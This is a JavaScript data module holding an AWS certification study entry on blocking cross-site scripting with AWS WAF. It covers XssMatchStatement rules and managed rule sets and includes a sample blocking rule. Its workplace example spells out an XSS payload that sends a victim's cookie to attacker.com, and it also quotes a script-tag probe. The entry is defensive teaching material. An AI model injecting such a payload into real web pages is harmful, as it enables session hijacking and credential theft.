import { createAwsKnowledgeGuide } from '../createAwsKnowledgeGuide.js';

export default createAwsKnowledgeGuide({
  id: 'waf-13',
  topicId: 'topic-waf',
  topicTitle: 'AWS WAF',
  objectiveCode: 'Security',
  title: 'Cross-Site Scripting Protection',
  status: 'ready',
  plainEnglish: 'Cross-Site Scripting (XSS) is a web security vulnerability where an attacker injects malicious client-side executable scripts (such as `<script>alert(document.cookie)</script>` or JavaScript payload handlers like `onload=` and `onerror=`) into benign web pages viewed by other users. When other users load the compromised page, their browser executes the attacker\'s script, allowing session hijacking, credential theft, and unauthorized actions. AWS WAF provides native XSS Match statements and managed rule sets that inspect request parameters, headers, and request bodies for malicious JavaScript and HTML injection patterns, blocking them before they reach the server.',
  whyItMatters: 'XSS attacks allow adversaries to steal session cookies, impersonate users, redirect victims to phishing portals, and deface web properties. Preventing malicious script injection at the WAF perimeter stops reflected and stored XSS vectors before they ever enter application data stores or render in client browsers.',
  workplaceExample: 'A customer feedback portal allows users to submit reviews. A malicious user submits a review containing `<img src=x onerror=this.src=\'http://attacker.com/steal?cookie=\'+document.cookie>`. AWS WAF inspects the POST request body using an XSS match statement, identifies the malicious HTML script execution payload, and blocks the request immediately with an HTTP 403 response, protecting the feedback database and the internal moderators who review submissions.',
  examFocus: 'SAA-C03 core points: (1) Native XSS Statement: `XssMatchStatement` inspects URI, query arguments, headers, cookies, or body for HTML tags and script execution syntax. (2) Core Rule Set: `AWSManagedRulesCommonRuleSet` includes built-in XSS inspection rules (`CrossSiteScripting_BODY`, `CrossSiteScripting_COOKIE`, `CrossSiteScripting_QUERYARGUMENTS`, `CrossSiteScripting_URIPATH`). (3) Text Transformations: Essential to chain `HTML_ENTITY_DECODE` and `URL_DECODE` to uncover obfuscated script tags like `&lt;script&gt;` or `%3Cscript%3E`.',
  keyPoints: [
    'Protects web applications against client-side script injection and session hijacking attacks.',
    'Native `XssMatchStatement` inspects request bodies, headers, URIs, and query strings.',
    'Included as a core component of `AWSManagedRulesCommonRuleSet`.',
    'Detects script tags, DOM event handlers (`onload`, `onerror`), and JavaScript URI schemes.',
    'Requires text transformations (`HTML_ENTITY_DECODE`, `URL_DECODE`) to defeat encoding evasion.',
    'Prevents reflected, stored, and DOM-based XSS payloads from entering backend application databases.'
  ],
  commonMistake: 'Forgetting to apply `HTML_ENTITY_DECODE` in XSS inspection rules. Attackers frequently HTML-encode malicious payloads (e.g., `&#x3C;script&#x3E;`); without HTML entity decoding enabled in WAF text transformations, the raw text may bypass plain string matching.',
  example: 'Configure an XSS match rule inspecting all query parameters with dual text transformations: {"Name": "BlockXSSInQueryParams", "Priority": 4, "Statement": {"XssMatchStatement": {"FieldToMatch": {"AllQueryArguments": {}}, "TextTransformations": [{"Priority": 0, "Type": "URL_DECODE"}, {"Priority": 1, "Type": "HTML_ENTITY_DECODE"}]}}, "Action": {"Block": {}}, "VisibilityConfig": {"SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "BlockXSSInQueryParams"}}.',
  sources: [
    {
      title: 'Cross-Site Scripting (XSS) Match Rule Statements in AWS WAF',
      url: 'https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-xss-match.html'
    },
    {
      title: 'AWS Managed Rules Common Rule Set',
      url: 'https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html'
    }
  ]
});
